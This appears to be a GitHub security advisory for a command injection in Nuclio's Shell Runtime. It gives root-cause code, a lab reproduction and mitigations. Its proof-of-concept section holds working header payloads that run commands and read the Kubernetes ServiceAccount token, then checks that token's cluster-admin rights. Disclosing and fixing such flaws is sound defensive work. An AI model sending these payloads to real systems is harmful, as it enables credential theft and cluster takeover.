# [H] Nuclio Shell Runtime Command Injection Leading to Privilege Escalation

## Summary
Severity: High
Advisory: GHSA-95fj-3w7g-4r27
CVE: CVE-2026-29042
CWE: CWE-75
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-95fj-3w7g-4r27
Type: github-advisory

## Affected
- Go: `github.com/nuclio/nuclio` — affected >=0 <1.15.20

## Details
## Summary

This vulnerability exists in Nuclio's Shell Runtime component, allowing attackers with function invocation permissions to inject malicious commands via HTTP request headers, execute arbitrary code with root privileges in function containers, steal ServiceAccount Tokens with cluster-admin level permissions, and ultimately achieve complete control over the entire Kubernetes cluster. Recommended CWE classification: CWE-78 (OS Command Injection).

Nuclio Shell Runtime processes the `X-Nuclio-Arguments` HTTP header without validation or escaping, directly concatenating user input into shell commands executed via `sh -c`. This allows arbitrary command injection, enabling attackers to read sensitive files (including ServiceAccount tokens) and access the Kubernetes API with cluster-level privileges.

## Details

### Vulnerability Description

The Nuclio Shell Runtime component contains a critical command injection vulnerability in how it processes user-supplied arguments. When a function is invoked via HTTP, the runtime reads the `X-Nuclio-Arguments` header and directly incorporates its value into shell commands without any validation or sanitization.

### Root Cause Analysis

**Vulnerable Code Location 1:** `pkg/processor/runtime/shell/runtime.go:289-297`

```go
func (s *shell) getCommandArguments(event nuclio.Event) []string {
    arguments := event.GetHeaderString(headers.Arguments)

    if arguments == "" {
        arguments = s.configuration.Arguments
    }

    return strings.Split(arguments, " ")  // No validation performed
}
```

The function retrieves the `X-Nuclio-Arguments` header value and splits it by spaces without any validation. Shell metacharacters like `;`, `|`, `&&`, backticks, and `$()` are not filtered or escaped.

**Vulnerable Code Location 2:** `pkg/processor/runtime/shell/runtime.go:204-213`

```go
if s.commandInPath {
    // if the command is an executable, run it as a command with sh -c.
    cmd = exec.CommandContext(context, "sh", "-c", strings.Join(command, " "))
} else {
    // if the command is a shell script run it with sh(without -c).
    cmd = exec.CommandContext(context, "sh", command...)
}

cmd.Stdin = strings.NewReader(string(event.GetBody()))
```

The runtime joins the command array (which includes user-controlled arguments) into a single string and executes it using `sh -c`. This execution mode interprets shell metacharacters, enabling command injection.

### Attack Flow

1. Attacker sends HTTP request to Nuclio function with malicious `X-Nuclio-Arguments` header
2. Runtime extracts header value without validation
3. Malicious payload is concatenated into shell command
4. Command is executed via `sh -c` with root privileges
5. Attacker executes arbitrary commands (e.g., reading ServiceAccount token)
6. Attacker uses stolen token to access Kubernetes API with cluster-admin privileges

## PoC

### Environment Setup

**Prerequisites:**
- Docker installed
- kubectl installed
- Helm 3.x installed
- 8GB RAM minimum

**Step 1: Create Kubernetes Cluster**

```bash
# Install Kind
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.20.0/kind-linux-amd64
chmod +x ./kind
sudo mv ./kind /usr/local/bin/kind

# Create cluster with registry configuration
cat > kind-config.yaml <<EOF
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
- role: worker
EOF

kind create cluster --name nuclio-test --config kind-config.yaml
```

**Step 2: Setup Local Registry**

```bash
# Start registry container
docker run -d -p 5000:5000 --name registry --network kind registry:2
docker network connect kind registry

# Configure containerd on worker node
docker exec nuclio-test-worker bash -c 'cat >> /etc/containerd/config.toml << EOF

[plugins."io.containerd.grpc.v1.cri".registry.mirrors."registry:5000"]
  endpoint = ["http://registry:5000"]
[plugins."io.containerd.grpc.v1.cri".registry.configs."registry:5000".tls]
  insecure_skip_verify = true
EOF'

docker exec nuclio-test-worker systemctl restart containerd
```

**Step 3: Install Nuclio**

```bash
# Add Helm repository
helm repo add nuclio https://nuclio.github.io/nuclio/charts
helm repo update

# Install Nuclio 1.15.17
helm install nuclio nuclio/nuclio \
  --namespace nuclio \
  --create-namespace \
  --set registry.pushPullUrl=registry:5000

# Wait for pods to be ready
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=nuclio -n nuclio --timeout=300s
```

**Step 4: Deploy Vulnerable Function**

```bash
# Create shell script
cat > echo.sh <<'EOF'
#!/bin/sh
echo "Response from shell function"
EOF
chmod +x echo.sh

# Create project
kubectl apply -f - <<EOF
apiVersion: nuclio.io/v1beta1
kind: NuclioProject
metadata:
  name: default
  namespace: nuclio
spec:
  displayName: Default Project
EOF

# Deploy function
nuctl deploy shell-func \
  --path echo.sh \
  --runtime shell \
  --namespace nuclio \
  --registry localhost:5000 \
  --run-registry registry:5000 \
  --project-name default

# Verify deployment
kubectl -n nuclio get pods -l nuclio.io/function-name=shell-func
```

### Exploitation

**Test 1: Verify Command Injection**

```bash
kubectl run -n nuclio exploit-test \
  --image=curlimages/curl:latest \
  --rm -i --restart=Never -- \
  curl -s -X POST \
  -H "Content-Type: text/plain" \
  -H "x-nuclio-arguments: ; id ; whoami ;" \
  -d "test" \
  http://nuclio-shell-func:8080
```

**Expected Output:**
```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
root
```

**Test 2: Extract ServiceAccount Token**

```bash
kubectl run -n nuclio token-extract \
  --image=curlimages/curl:latest \
  --rm -i --restart=Never -- \
  curl -s -X POST \
  -H "Content-Type: text/plain" \
  -H "x-nuclio-arguments: ; cat /var/run/secrets/kubernetes.io/serviceaccount/token ;" \
  -d "test" \
  http://nuclio-shell-func:8080
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IldUZFN0d3dod2hSNE8yLWtRZmc0Z0N0UWNtaDMxVDhEVlQyYWRnS3AzbEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODAyMzk4Mzg3...
```

**Test 3: Validate Token Privileges**

```bash
# Extract token from previous output and test permissions
TOKEN="<extracted-token>"

kubectl auth can-i --list --token="$TOKEN"
```

**Expected Output:**
```
Resources                                       Non-Resource URLs   Resource Names   Verbs
*.*                                             []                  []               [*]
                                                [*]                 []               [*]
```

This confirms the token has cluster-admin level permissions.

**Test 4: Verify Cluster Access**

```bash
# Test reading secrets
kubectl auth can-i get secrets --all-namespaces --token="$TOKEN"
# Output: yes

# Test creating pods
kubectl auth can-i create pods --all-namespaces --token="$TOKEN"
# Output: yes
```

### Alternative Injection Methods

**Backtick Injection:**
```bash
curl -s -X POST \
  -H "Content-Type: text/plain" \
  -H 'x-nuclio-arguments: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`' \
  -d "test" \
  http://nuclio-shell-func:8080
```

**$() Syntax Injection:**
```bash
curl -s -X POST \
  -H "Content-Type: text/plain" \
  -H 'x-nuclio-arguments: $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' \
  -d "test" \
  http://nuclio-shell-func:8080
```

Both methods successfully extract the token.

## Impact

### Severity Assessment

This vulnerability enables complete cluster compromise through a multi-stage attack:

**Stage 1: Command Injection**
- Attacker injects malicious commands via HTTP header
- Commands execute with root privileges in function container
- No authentication or authorization checks on command content

**Stage 2: Credential Theft**
- Attacker reads ServiceAccount token from mounted secret
- Token belongs to `system:serviceaccount:nuclio:default`
- Token has cluster-admin level permissions

**Stage 3: Privilege Escalation**
- Attacker uses stolen token to authenticate to Kubernetes API
- Gains full control over all cluster resources
- Can read all secrets, create/modify/delete any resource

### Affected Resources

**Confidentiality Impact:** High
- All secrets across all namespaces can be read
- Database credentials, API keys, certificates exposed
- Application data and configuration accessible

**Integrity Impact:** High
- Attacker can modify any cluster resource
- Can deploy malicious workloads
- Can alter RBAC policies and security controls
- Can inject backdoors for persistent access

**Availability Impact:** Medium
- Attacker can delete critical resources
- Can deploy resource-intensive workloads causing DoS
- Can disrupt cluster operations

### Real-World Attack Scenarios

**Scenario 1: Data Breach**
1. Attacker gains function invocation access (low privilege)
2. Injects command to extract ServiceAccount token
3. Uses token to read all secrets in production namespace
4. Exfiltrates database credentials and API keys
5. Accesses production databases and external services

**Scenario 2: Supply Chain Compromise**
1. Attacker compromises CI/CD pipeline
2. Deploys malicious Nuclio function
3. Function automatically executes on deployment
4. Establishes persistent backdoor in cluster
5. Pivots to compromise other applications

**Scenario 3: Ransomware Attack**
1. Attacker exploits vulnerability to gain cluster access
2. Deploys crypto-mining or ransomware pods
3. Encrypts persistent volumes
4. Demands ransom for decryption keys

## Severity

**CVSS v3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L

**CVSS Score:** 9.1 (Critical)

**Justification:**
- **Attack Vector (Network):** Exploitable remotely via HTTP
- **Attack Complexity (Low):** No special conditions required
- **Privileges Required (Low):** Only function invocation permission needed
- **User Interaction (None):** Fully automated exploitation
- **Scope (Changed):** Breaks out of function container to cluster level
- **Confidentiality (High):** Complete access to all secrets
- **Integrity (High):** Full control over cluster resources
- **Availability (Low):** Limited direct availability impact

## Affected Versions

- Nuclio: All versions up to and including 1.15.19
- Component: Shell Runtime (`pkg/processor/runtime/shell`)

The vulnerability exists in all versions that include the Shell Runtime component, as the vulnerable code pattern has been present since the feature's introduction.

## Patched Versions

No patch is currently available. Users should implement workarounds until an official fix is released.

## Workarounds

### Immediate Mitigation (Choose One)

**Option 1: Disable Shell Runtime**

Add to Nuclio platform configuration:

```yaml
platformConfig:
  runtimes:
    shell:
      enabled: false
```

This completely disables the vulnerable component but breaks existing Shell Runtime functions.

**Option 2: Restrict Function Deployment**

Limit who can deploy functions using RBAC:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: nuclio-function-deployer
  namespace: nuclio
rules:
- apiGroups: ["nuclio.io"]
  resources: ["nucliofunctions"]
  verbs: ["create", "update", "patch"]
  # Only grant to trusted users
```

Remove default function deployment permissions from untrusted users.

**Option 3: Network Isolation**

Restrict egress traffic from function pods:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: nuclio-processor-egress
  namespace: nuclio
spec:
  podSelector:
    matchLabels:
      nuclio.io/component: processor
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector: {}
    ports:
    - protocol: TCP
      port: 443  # Only allow HTTPS to cluster API
```

This limits the attacker's ability to exfiltrate data but doesn't prevent the initial exploitation.

### Long-Term Fixes

**Fix 1: Input Validation**

Implement strict validation in `getCommandArguments`:

```go
import "regexp"

var argumentsRegex = regexp.MustCompile(`^[a-zA-Z0-9_\-=., ]+$`)

func (s *shell) getCommandArguments(event nuclio.Event) []string {
    arguments := event.GetHeaderString(headers.Arguments)

    if arguments == "" {
        arguments = s.configuration.Arguments
    }

    if !argumentsRegex.MatchString(arguments) {
        s.Logger.ErrorWith("Invalid arguments: contains unsafe characters")
        return []string{}
    }

    return strings.Split(arguments, " ")
}
```

**Fix 2: Remove sh -c Execution**

Use parameterized command execution:

```go
func (s *shell) processEvent(context context.Context,
    command []string,
    event nuclio.Event,
    responseChan chan nuclio.Response) {

    var cmd *exec.Cmd

    if len(command) > 0 {
        cmd = exec.CommandContext(context, command[0], command[1:]...)
    } else {
        // Handle error
        return
    }

    cmd.Stdin = strings.NewReader(string(event.GetBody()))
    // ... rest of code
}
```

**Fix 3: Limit ServiceAccount Permissions**

Create restricted ServiceAccount for function pods:

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: nuclio-function-sa
  namespace: nuclio
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: nuclio-function-role
  namespace: nuclio
rules:
- apiGroups: [""]
  resources: ["configmaps"]
  verbs: ["get", "list"]
# Do not grant secrets or cross-namespace access
```

## Resources

- Nuclio GitHub: https://github.com/nuclio/nuclio
- CWE-78: OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Kubernetes Security Best Practices: https://kubernetes.io/docs/concepts/security/

## Credits
credit for:
@b0b0haha (603571786@qq.com)
@j311yl0v3u (2439839508@qq.com)

## References
- https://github.com/nuclio/nuclio/security/advisories/GHSA-95fj-3w7g-4r27
- https://nvd.nist.gov/vuln/detail/CVE-2026-29042
- https://github.com/nuclio/nuclio/pull/4030
- https://github.com/nuclio/nuclio/commit/5352d7e16cf92f4350a2f8d806c4b80b626b5c5a
- https://github.com/nuclio/nuclio
- https://github.com/nuclio/nuclio/releases/tag/1.15.20
